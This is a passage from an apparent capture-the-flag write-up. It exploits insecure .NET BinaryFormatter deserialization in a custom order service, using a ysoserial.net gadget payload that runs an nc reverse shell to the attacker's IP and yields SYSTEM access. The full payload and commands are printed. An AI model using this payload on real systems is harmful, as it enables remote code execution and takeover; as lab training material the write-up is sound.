6/9/2022 1:31:48 PM	Deserializing single sales order from base64: AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzc0OQYEAAAAC1NDUk1RVTkyMjEwBgUAAAAJUyBKZW5raW5zCQYAAAAAAJ07rZbaCAAAAAAAUJJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
6/9/2022 1:31:48 PM	Binary formatter init successful
6/9/2022 1:31:48 PM	Deserialization successful
6/9/2022 1:31:48 PM	Finished deserializing all sales orders
6/9/2022 1:37:12 PM	Uploading new order with reference 1
6/9/2022 1:37:12 PM	Binary formatter init successful
6/9/2022 1:37:12 PM	Order serialized to base64: AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAABMQYEAAAABDEwMDAGBQAAAApSIEdvb2RoYW5kCQYAAAAAgCH/qknaCAAAAAAAQI9ABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
6/9/2022 1:37:12 PM	Connecting to server
6/9/2022 1:37:12 PM	Received from server: SCRAMBLECORP_ORDERS_V1.0.3;
6/9/2022 1:37:12 PM	Parsing server response
6/9/2022 1:37:12 PM	Response type = Banner
6/9/2022 1:37:12 PM	Sending data to server: UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAABMQYEAAAABDEwMDAGBQAAAApSIEdvb2RoYW5kCQYAAAAAgCH/qknaCAAAAAAAQI9ABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
6/9/2022 1:37:12 PM	Getting response from server
6/9/2022 1:37:12 PM	Received from server: SUCCESS;

```

“Binary formatter init successful” will be useful in the next attack.

I can see exactly in the code where this happens, in the `SalesOrder` class in `ScrambleLib.dll`:

```

// Token: 0x06000024 RID: 36 RVA: 0x000022C0 File Offset: 0x000004C0
public string SerializeToBase64()
{
    BinaryFormatter binaryFormatter = new BinaryFormatter();
    Log.Write("Binary formatter init successful");
    string result;
    using (MemoryStream memoryStream = new MemoryStream())
    {
        binaryFormatter.Serialize(memoryStream, this);
        result = Convert.ToBase64String(memoryStream.ToArray());
    }
    return result;
}

```

### Deserialization Attack

#### Generate Payload

I’ll download the latest copy of ysoserial.net from the [release page](https://github.com/pwntester/ysoserial.net/releases). This is a tool that will generate .NET serialized payloads that will abuse different gadgets in the existing code to get code execution. I’ve not been able to get this tool to run on Linux, so I will have to jump to a Windows VM to generate this payload.

Some Googling about the binary formatter class specifically will show it’s insecure. From [Microsoft doc](https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide):

![image-20220609165011806](https://0xdfimages.gitlab.io/img/image-20220609165011806.png)

Knowing the plugin that’s installed, I just need to pick a gadget. They are all listed on the [GitHub page](https://github.com/pwntester/ysoserial.net) or with `ysoserial.exe -h`. I want one that works with `BinaryFormatter`, and I’ll start with ones that don’t require any special conditions. `AxHostState` seems like a good start (many will work). I’ll it:

```

PS > .\ysoserial.exe -f BinaryFormatter -g AxHostState -o base64 -c "C:\\programdata\\nc64.exe 10.10.14.6 444 -e cmd.exe"
AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAL8DAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA4QU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/Pg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI+DQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQogICAgPHNkOlByb2Nlc3M+DQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgQzpcXHByb2dyYW1kYXRhXFxuYzY0LmV4ZSAxMC4xMC4xNC42IDQ0NCAtZSBjbWQuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL

```

#### Send Payload

I’ll listen with `nc` on TCP 444 and connect to 4411 with `nc`:

```

oxdf@hacky$ nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3;

```

Just like in WireShark, I’ll enter `UPLOAD_ORDER;[serialized object]`:

```

oxdf@hacky$ nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAL8DAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA4QU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/Pg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI+DQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQogICAgPHNkOlByb2Nlc3M+DQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgQzpcXHByb2dyYW1kYXRhXFxuYzY0LmV4ZSAxMC4xMC4xNC42IDQ0NCAtZSBjbWQuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL
ERROR_GENERAL;Error deserializing sales order: Unable to cast object of type 'State' to type 'ScrambleLib.SalesOrder'.

```

It throws an error, and hangs. At `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.10.11.168 55575
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

And I can grab `root.txt`:

```

C:\Users\administrator\Desktop>type root.txt
506ae611************************

```